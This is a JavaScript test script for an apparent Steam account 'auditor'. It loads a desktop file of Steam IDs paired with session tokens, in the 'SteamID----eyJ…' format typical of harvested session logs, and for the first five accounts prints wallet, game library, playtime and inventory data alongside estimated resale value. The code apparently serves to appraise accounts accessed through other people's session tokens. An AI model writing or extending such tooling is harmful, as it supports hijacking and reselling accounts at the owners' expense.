import fs from 'fs';
import { SteamSessionEngine } from '../src/tools/steamAuditor/SteamSessionEngine.js';
import { WalletSecurityCollector } from '../src/tools/steamAuditor/Collectors/WalletSecurityCollector.js';
import { CS2FaceitCollector } from '../src/tools/steamAuditor/Collectors/CS2FaceitCollector.js';
import { GamesInventoryCollector } from '../src/tools/steamAuditor/Collectors/GamesInventoryCollector.js';

const steamTxt = fs.readFileSync('C:\\Users\\iliyk\\Desktop\\steam.txt', 'utf8');
const tokenMatches = steamTxt.match(/7656119\d+----ey[A-Za-z0-9_\-.]+/g) || [];

console.log(`Loaded ${tokenMatches.length} tokens from steam.txt.`);
console.log('Testing STAGE 4 (Games Library, Playtime, Dota2, TF2 & Rust) on top 5 accounts...\n');

async function runStage4Test() {
  const accountsToTest = tokenMatches.slice(0, 5);

  for (let i = 0; i < accountsToTest.length; i++) {
    const raw = accountsToTest[i];
    const parsed = SteamSessionEngine.parseToken(raw);
    const profile = await SteamSessionEngine.fetchLiveProfile(parsed.steamid);
    let acc = { ...parsed, profile };

    acc = await WalletSecurityCollector.auditStage2(acc);
    acc = await CS2FaceitCollector.auditStage3(acc);
    acc = await GamesInventoryCollector.auditStage4(acc);

    console.log(`\n================ ACCOUNT #${i + 1} [${acc.profile.nickname} | ${acc.steamid}] ================`);
    console.log('🎮 Games Library:');
    console.log(`   • Total Games in Library: ${acc.games.totalGamesCount}`);
    console.log(`   • Total Playtime: ${acc.games.totalPlaytimeHours} hrs`);
    console.log(`   • Hours Breakdown: CS2: ${acc.games.hoursByGame.cs2}h | Dota2: ${acc.games.hoursByGame.dota2}h | Rust: ${acc.games.hoursByGame.rust}h | GTA V: ${acc.games.hoursByGame.gta5}h`);
    console.log(`   • Paid Games Count: ${acc.games.paidGames.length}`);
    console.log(`   • Library Retail Value: $${acc.games.libraryRetailValueUsd}`);
    console.log(`   • Added Resale Value: $${acc.games.libraryAccountValueUsd}`);

    if (acc.games.paidGames.length > 0) {
      console.log('   • Paid Titles:');
      acc.games.paidGames.forEach(g => {
        console.log(`      - ${g.name} (${g.hours}h) [Val: +$${g.addedValueUsd}]`);
      });
    }

    console.log('📦 Secondary Inventories:');
    console.log(`   • Dota 2: ${acc.secondaryInventories.dota2.isPublic ? `${acc.secondaryInventories.dota2.totalItems} items ($${acc.secondaryInventories.dota2.worthUsd})` : 'Private / Empty'}`);
    console.log(`   • TF2: ${acc.secondaryInventories.tf2.isPublic ? `${acc.secondaryInventories.tf2.totalItems} items ($${acc.secondaryInventories.tf2.worthUsd})` : 'Private / Empty'}`);
    console.log(`   • Rust: ${acc.secondaryInventories.rust.isPublic ? `${acc.secondaryInventories.rust.totalItems} items ($${acc.secondaryInventories.rust.worthUsd})` : 'Private / Empty'}`);
  }

  console.log('\n Stage 4 Games & Secondary Inventories Engine successfully verified!');
}

runStage4Test();
